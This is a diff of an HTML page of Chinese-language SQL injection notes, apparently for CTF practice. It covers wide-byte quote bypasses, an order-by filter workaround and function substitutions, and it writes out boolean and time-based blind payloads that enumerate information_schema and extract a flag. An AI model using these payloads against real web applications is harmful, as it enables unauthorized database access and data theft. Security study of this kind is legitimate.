@@ -503,6 +773,7 @@ Content-Type: text/xml
 <li>id=1’ union select 1,2,’3</li>
 </ul>
 <h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>尝试宽字节    %bf%27 %df%27 %aa%27</p>
+<h3 id="过滤order-by"><a href="#过滤order-by" class="headerlink" title="过滤order by"></a>过滤order by</h3><p>当order by 被过滤后就可以使用into 变量来绕过<br><code>select * from yz limit 1,1 into @a,@b,@c;</code></p>
 <h3 id="利用等价函数"><a href="#利用等价函数" class="headerlink" title="利用等价函数"></a>利用等价函数</h3><ul>
 <li>hex()、bin() ==&gt; ascii()</li>
 <li>sleep() ==&gt; benchmark()</li>
@@ -570,9 +841,9 @@ Content-Type: text/xml
 <p><strong>此处说明sleep（0.5）</strong>：说是睡0.5秒实际上是 表中除了name=’’以外的记录数×0.5秒</p>
 <p>此句中的sleep()语句会跟 or还是and 以及 select主句中查询的记录数 有关。<br>具体情况自己可以在mysql中试验。</p>
 <p>实际操作中写的数值大就好，因为我们会根据timeout时间超时来判断，超时–&gt;正确；不超时–&gt;错误。</p>
-<h3 id="3-猜解库，表，列"><a href="#3-猜解库，表，列" class="headerlink" title="3.猜解库，表，列"></a>3.猜解库，表，列</h3><p><strong>布尔型</strong>：用字典文件替换db,table,column,如果不存在，返回false界面；存在，返回true界面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and column is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span><span class="string">' and column is not null -- '</span></div><div class="line"></div><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and table.user is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name='</span> and db.table.user is not null --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=<span class="string">' and (select count(*) from table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> and (select count(*) from db.table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</div></pre></td></tr></table></figure></p>
+<h3 id="3-猜解库，表，列"><a href="#3-猜解库，表，列" class="headerlink" title="3.猜解库，表，列"></a>3.猜解库，表，列</h3><p><strong>布尔型</strong>：用字典文件替换db,table,column,如果不存在，返回false界面；存在，返回true界面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and column is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span><span class="string">' and column is not null -- '</span></div><div class="line"></div><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and table.user is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name='</span> and db.table.user is not null --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=<span class="string">' and (select count(*) from table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> and (select count(*) from db.table)&gt;0 --+</div></pre></td></tr></table></figure></p>
 <p><strong>时间型</strong>：用字典文件替换db,table,column,如果不存在，立即返回；存在，超时。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (column is not null),sleep(5),1) --+  </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span>1<span class="string">' and if( (column is not null),sleep(0.5)&amp;1,1) -- '</span></div><div class="line"></div><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (table.column is not null),sleep(5),1) --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (db.table.column is not null),sleep(5),1) --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select count(*) from table)&gt;0 ,sleep(5),1)--+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> and <span class="keyword">if</span>( (select count(*) from db.table)&gt;0 ,sleep(5),1) --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (column is not null),sleep(5),1) --+  </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span>1<span class="string">' and if( (column is not null),sleep(0.5)&amp;1,1) -- '</span></div><div class="line"></div><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (table.column is not null),sleep(5),1) --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (db.table.column is not null),sleep(5),1) --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select count(*) from table)&gt;0 ,sleep(5),1)--+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> and <span class="keyword">if</span>( (select count(*) from db.table)&gt;0 ,sleep(5),1) --+</div></pre></td></tr></table></figure>
 <h3 id="4-从information-schema中读取列，表，库"><a href="#4-从information-schema中读取列，表，库" class="headerlink" title="4.从information_schema中读取列，表，库"></a>4.从information_schema中读取列，表，库</h3><p>如果有访问information_schema的权限，当然可以从中读取。<br>此处列出时间型的小栗子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">1.读取列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(column_name,1,1) from information_schema.columns limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">2.读取表名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (select substring(table_name,1,1) from information_schema.tables  <span class="built_in">limit</span> 1 offset 0 )=<span class="string">'A'</span> ,sleep(5),1)--+  </div><div class="line"></div><div class="line">3.读取库名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(table_schema,1,1) from information_schema.tables group by table_schema limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">4.读取表的库名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (select substring(table_schuma,1,1) from information_schema.tables <span class="built_in">where</span> table_name=<span class="string">'XXXX'</span>  <span class="built_in">limit</span> 1 offset 0 )=<span class="string">'A'</span> ,sleep(5),1)--+  </div><div class="line"></div><div class="line">5.读取列的库名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(table_name,1,1) from information_schema.columns where column_name='</span>XXXX<span class="string">'  limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div></pre></td></tr></table></figure></p>
 <p>布尔型的就以此类推，不再写了吧。</p>
 <h3 id="5-猜解FLAG"><a href="#5-猜解FLAG" class="headerlink" title="5.猜解FLAG"></a>5.猜解FLAG</h3><p>可用select：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' union select  ascii(substring(flag,1,1)) from flag ='</span>102    ------&gt;ascii匹配</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' union select  substring(flag,1,1) from flag ='</span>A<span class="string">'            ------&gt;字符匹配</span></div></pre></td></tr></table></figure></p>
